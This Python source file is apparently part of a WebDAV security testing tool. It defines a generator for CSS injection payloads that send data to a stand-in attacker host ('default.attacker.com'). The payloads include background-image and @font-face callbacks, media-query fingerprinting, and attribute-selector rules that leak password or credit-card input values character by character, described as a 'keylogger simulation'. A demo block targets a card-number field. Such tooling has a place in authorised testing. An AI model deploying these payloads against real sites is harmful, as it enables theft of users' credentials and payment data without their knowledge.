import os
import time
import logging
from payload_generator import PayloadGenerator

logger = logging.getLogger(__name__)
if not logger.handlers: # Ensure logger is configured if not already by application
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] %(name)s: %(message)s')

class CSSPayloadGenerator(PayloadGenerator):
    """Generator for CSS-based payloads."""

    def __init__(self, config=None):
        super().__init__(config)
        self.payload_templates = {
            'basic': self._generate_basic_css,
            'background_exfil': self._generate_background_exfil, # Generic trigger
            'font_face_exfil': self._generate_font_face_exfil,
            'media_query_exfil': self._generate_media_query_exfil,
            'input_value_exfil': self._generate_input_value_exfil, # More specific attribute technique
            'keylogger_simulation': self._generate_css_keylogger_simulation
        }

    def get_available_payloads(self):
        """Return list of available CSS payload types."""
        return list(self.payload_templates.keys())

    def generate(self, payload_type, params=None):
        """
        Generate a CSS payload of the specified type.

        Args:
            payload_type (str): The type of CSS payload to generate.
            params (dict, optional): Parameters for the payload, e.g.,
                                     {'callback_url': '...', 'target_element': '...'}.

        Returns:
            str: The filepath of the generated CSS payload.

        Raises:
            ValueError: If the payload_type is unknown.
        """
        params = params or {}

        if payload_type not in self.payload_templates:
            logger.error(f"Unknown CSS payload type requested: {payload_type}")
            raise ValueError(f"Unknown CSS payload type: {payload_type}")

        generator_func = self.payload_templates[payload_type]
        logger.info(f"Generating CSS payload of type '{payload_type}' with params: {params}")

        try:
            css_content = generator_func(params)
        except Exception as e:
            logger.error(f"Error during generation of CSS type '{payload_type}': {e}", exc_info=True)
            raise

        safe_payload_type = "".join(c if c.isalnum() else "_" for c in payload_type)
        timestamp = int(time.time())
        filename = f"payload_css_{safe_payload_type}_{timestamp}.css"

        return self.save_payload(filename, css_content)

    def _generate_basic_css(self, params):
        """Generate a basic, benign CSS file for testing."""
        logger.debug("Generating basic CSS.")
        return """/* WebDAV Security Test CSS - Basic */
body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0; /* Light grey background */
    color: #333; /* Dark grey text */
}
.test-css-element {
    border: 2px dashed blue;
    padding: 15px;
    margin: 10px;
    background-color: #e7f3fe; /* Light blue background */
}
/* End of basic test CSS */
"""

    def _generate_background_exfil(self, params):
        """Generate CSS with background-image exfiltration for a generic element."""
        callback_url = params.get('callback_url', 'https://default.attacker.com/css_bg_exfil')
        # Target element for which a background image request will be made
        target_element = params.get('target_element', 'body') # Default to body
        exfil_trigger_info = params.get('exfil_trigger_info', 'generic_bg_trigger')

        logger.debug(f"Generating background_exfil CSS for '{target_element}' to '{callback_url}'.")

        return f"""/* CSS Background Exfiltration Test (Generic Trigger) */
{target_element} {{
    /* This rule attempts to make a request when the element is rendered. */
    /* Useful for confirming CSS execution and basic connectivity from CSS. */
    background-image: url('{callback_url}?trigger={exfil_trigger_info.replace(" ", "_")}');
}}
"""

    def _generate_font_face_exfil(self, params):
        """Generate CSS using @font-face for exfiltration (timing or simple request)."""
        callback_url = params.get('callback_url', 'https://default.attacker.com/css_font_exfil')
        font_family_name = params.get('font_family_name', 'LeakyFontWebDAVTest') # Unique name
        exfil_trigger_info = params.get('exfil_trigger_info', 'font_load_attempt')

        logger.debug(f"Generating font_face_exfil CSS for font '{font_family_name}' to '{callback_url}'.")

        return f"""/* CSS @font-face Exfiltration Test */
@font-face {{
    font-family: '{font_family_name}';
    src: url('{callback_url}?font_family={font_family_name.replace(" ", "_")}&trigger={exfil_trigger_info.replace(" ", "_")}');
}}

/* Example usage of the font to potentially trigger the load if not automatically loaded */
body {{
    /* Applying to body might not always trigger if font is not used or preloaded. */
    /* More reliable trigger is to apply to a visible element with text. */
}}
.use-leaky-font-webdav {{ /* Specific class to apply the font */
    font-family: '{font_family_name}', sans-serif;
    content: "Testing Leaky Font."; /* Ensure there's content */
}}
"""

    def _generate_media_query_exfil(self, params):
        """Generate CSS using media queries for device fingerprinting/exfiltration."""
        callback_url = params.get('callback_url', 'https://default.attacker.com/css_media_exfil')

        logger.debug(f"Generating media_query_exfil CSS to '{callback_url}'.")

        # Define a set of common media features to test
        # These are examples; a real implementation might have more
        media_tests = {
            "min_width_1920px": "@media screen and (min-width: 1920px)",
            "max_width_768px": "@media screen and (max-width: 768px)", # Common tablet/mobile breakpoint
            "prefers_dark_scheme": "@media (prefers-color-scheme: dark)",
            "prefers_light_scheme": "@media (prefers-color-scheme: light)",
            "orientation_landscape": "@media (orientation: landscape)",
            "orientation_portrait": "@media (orientation: portrait)",
        }

        css_parts = [f"/* CSS Media Query Exfiltration Test (Device Fingerprinting) */"]
        # Use a pseudo-element on body or html for these requests
        for key, query in media_tests.items():
            css_parts.append(f"""
{query} {{
    body::after {{ /* Using ::after, ensure it's not overwritten by other tests */
        content: ""; /* Required for background-image to apply */
        display:none; /* Keep it hidden */
        background-image: url('{callback_url}?media_feature_match={key}');
    }}
}}""")
        return "\n".join(css_parts)

    def _generate_input_value_exfil(self, params):
        """Generate CSS that attempts to exfiltrate input values character by character using attribute selectors."""
        callback_url = params.get('callback_url', 'https://default.attacker.com/css_input_exfil')
        target_input_selector = params.get('target_input_selector', 'input[name="password"]')
        chars_to_test = params.get('chars_to_test', "abcdefghijklmnopqrstuvwxyz0123456789") # Common subset

        logger.debug(f"Generating input_value_exfil CSS for '{target_input_selector}' to '{callback_url}'.")

        css_parts = [
            f"/* CSS Input Value Exfiltration Test for '{target_input_selector}' */",
            f"/* This technique's effectiveness is highly browser-dependent and often mitigated. */",
            f"/* It relies on the 'value' attribute being updated, which is not always the case for user input. */"
        ]

        for char_to_test in chars_to_test:
            # Need to escape characters that are special in CSS attribute selectors if any (e.g., quotes)
            # For simple alphanumeric, it's usually fine.
            # Example: input[name="password"][value^="a"]
            selector = f'{target_input_selector}[value^="{char_to_test}"]'
            css_parts.append(f"{selector} {{ background-image: url('{callback_url}?input={target_input_selector.replace(' ','_')}&value_starts_with={char_to_test.encode('utf-8').hex()}'); }}")

        # Example for testing presence of any value (if value attribute is non-empty)
        selector_has_value = f'{target_input_selector}[value]:not([value=""])'
        css_parts.append(f"{selector_has_value} {{ border-left: 1px solid transparent; background-image: url('{callback_url}?input={target_input_selector.replace(' ','_')}&has_value=true'); }}")

        return "\n".join(css_parts)

    def _generate_css_keylogger_simulation(self, params):
        """Generate CSS that simulates keylogging via attribute selectors (value$=char)."""
        callback_url = params.get('callback_url', 'https://default.attacker.com/css_keylog_sim')
        target_input_selector = params.get('target_input_selector', 'input[type="text"]')
        chars_to_test = params.get('chars_to_test', "abcdefghijklmnopqrstuvwxyz0123456789")

        logger.debug(f"Generating CSS keylogger simulation for '{target_input_selector}' to '{callback_url}'.")

        css_parts = [
            f"/* CSS Keylogger Simulation via attribute selectors (value$=char) for '{target_input_selector}' */",
            f"/* Effectiveness highly dependent on browser and relies on 'value' attribute reflecting typed characters. */"
        ]

        for char_to_test in chars_to_test:
            selector = f'{target_input_selector}[value$="{char_to_test}"]' # value *ends* with char
            css_parts.append(f"{selector} {{ background-image: url('{callback_url}?input={target_input_selector.replace(' ','_')}&value_ends_with={char_to_test.encode('utf-8').hex()}'); }}")

        return "\n".join(css_parts)

    def get_payload_params_definition(self, payload_name: str) -> list[dict]:
        """Return parameter definitions for the given CSS payload type."""
        definitions = []
        default_callback = 'https://default.attacker.com/css_callback'

        if payload_name == 'basic':
            pass # No parameters
        elif payload_name == 'background_exfil':
            definitions.extend([
                {
                    'name': 'callback_url', 'label': 'Callback URL', 'type': 'string',
                    'default': default_callback,
                    'description': 'URL to send the exfiltration trigger to.', 'required': True
                },
                {
                    'name': 'target_element', 'label': 'Target CSS Selector', 'type': 'string',
                    'default': 'body',
                    'description': 'CSS selector for the element whose background will trigger the exfil.', 'required': True
                },
                {
                    'name': 'exfil_trigger_info', 'label': 'Trigger Info (Query Param)', 'type': 'string',
                    'default': 'bg_exfil_active',
                    'description': 'Identifier sent as a query parameter in the callback.', 'required': False
                }
            ])
        elif payload_name == 'font_face_exfil':
            definitions.extend([
                {
                    'name': 'callback_url', 'label': 'Callback URL', 'type': 'string',
                    'default': default_callback,
                    'description': 'URL for the @font-face src.', 'required': True
                },
                {
                    'name': 'font_family_name', 'label': 'Font Family Name', 'type': 'string',
                    'default': 'LeakyFontCSSExfil',
                    'description': 'Custom font-family name to use.', 'required': True
                },
                {
                    'name': 'exfil_trigger_info', 'label': 'Trigger Info (Query Param)', 'type': 'string',
                    'default': 'font_exfil_attempt',
                    'description': 'Identifier sent as a query parameter.', 'required': False
                }
            ])
        elif payload_name == 'media_query_exfil':
            definitions.append({
                'name': 'callback_url', 'label': 'Callback URL Base', 'type': 'string',
                'default': default_callback,
                'description': 'Base URL for media query triggered requests. Feature name will be appended.', 'required': True
            })
        elif payload_name in ['input_value_exfil', 'keylogger_simulation']:
            definitions.extend([
                {
                    'name': 'callback_url', 'label': 'Callback URL Base', 'type': 'string',
                    'default': default_callback,
                    'description': 'Base URL for character exfiltration attempts.', 'required': True
                },
                {
                    'name': 'target_input_selector', 'label': 'Target Input CSS Selector', 'type': 'string',
                    'default': 'input[type="password"]' if payload_name == 'input_value_exfil' else 'input[type="text"]',
                    'description': 'CSS selector for the input field to target.', 'required': True
                },
                {
                    'name': 'chars_to_test', 'label': 'Characters to Test', 'type': 'string',
                    'default': 'abcdefghijklmnopqrstuvwxyz0123456789',
                    'description': 'String of characters to test for exfiltration.', 'required': False
                }
            ])
        return definitions


if __name__ == '__main__':
    main_logger_css = logging.getLogger(__name__)
    if not main_logger_css.handlers or main_logger_css.level > logging.DEBUG:
        if not main_logger_css.handlers:
            logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - [%(levelname)s] %(name)s: %(message)s')
        else:
            main_logger_css.setLevel(logging.DEBUG)
        # Ensure payload_generator's logger is also at debug if its messages are desired
        logging.getLogger('payload_generator').setLevel(logging.DEBUG)

    main_logger_css.info("CSSPayloadGenerator demonstration started.")

    test_output_dir_css = os.path.abspath('./generated_css_payloads_test_output')
    css_config = {'output_dir': test_output_dir_css}

    main_logger_css.info(f"Test CSS output directory configured to: {test_output_dir_css}")

    if os.path.exists(test_output_dir_css):
        main_logger_css.info(f"Attempting to remove existing CSS test directory: {test_output_dir_css}")
        import shutil
        try:
            shutil.rmtree(test_output_dir_css)
            main_logger_css.info("Successfully removed old CSS test directory.")
        except Exception as e:
            main_logger_css.error(f"Error removing old CSS test directory {test_output_dir_css}: {e}")

    try:
        css_gen = CSSPayloadGenerator(config=css_config)
        main_logger_css.info(f"CSSPayloadGenerator initialized. Output directory is: {css_gen.output_dir}")

        available_css_payloads = css_gen.get_available_payloads()
        main_logger_css.info(f"Available CSS payload types: {available_css_payloads}")

        default_callback = 'http://localhost:8000/css_listener'
        test_params_generic_exfil = {'callback_url': default_callback}
        test_params_input_exfil = {
            'callback_url': default_callback,
            'target_input_selector': 'input[name="credit_card_number"]', # A sensitive field example
            'chars_to_test': '0123456789'
        }
        test_params_keylog_sim = {
            'callback_url': default_callback,
            'target_input_selector': 'input[type="search"]',
            'chars_to_test': 'aeioustn' # common letters
        }


        for payload_name in available_css_payloads:
            main_logger_css.info(f"\n--- Generating CSS payload: {payload_name} ---")
            current_params = {} # Default to empty params
            if payload_name == 'basic':
                pass # No params needed for basic
            elif payload_name == 'input_value_exfil':
                current_params = test_params_input_exfil
            elif payload_name == 'keylogger_simulation':
                current_params = test_params_keylog_sim
            else: # For other exfil types like background, font, media
                current_params = test_params_generic_exfil

            try:
                file_path = css_gen.generate(payload_name, params=current_params)
                main_logger_css.info(f"Generated '{payload_name}' CSS payload at: {file_path}")
                if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                    main_logger_css.info(f"File '{file_path}' confirmed to exist and is not empty.")
                    # Optionally print content for debugging some payloads
                    if payload_name not in ['basic']:
                         with open(file_path, 'r', encoding='utf-8') as f_content:
                             main_logger_css.debug(f"Content of {payload_name} (first 300 chars):\n{f_content.read(300)}...")
                else:
                    main_logger_css.error(f"File '{file_path}' NOT FOUND or is EMPTY after generation.")
            except Exception as e:
                main_logger_css.error(f"Error generating CSS payload '{payload_name}': {e}", exc_info=True)

    except Exception as e:
        main_logger_css.error(f"Critical error in CSSPayloadGenerator demonstration: {e}", exc_info=True)
    finally:
        if os.path.exists(test_output_dir_css):
            main_logger_css.info(f"\nCleaning up CSS test directory: {test_output_dir_css}")
            try:
                import shutil # ensure imported
                shutil.rmtree(test_output_dir_css)
                main_logger_css.info("CSS test directory removed successfully.")
            except Exception as e:
                main_logger_css.error(f"Error removing CSS test directory {test_output_dir_css}: {e}", exc_info=True)

    main_logger_css.info("CSSPayloadGenerator demonstration finished.")
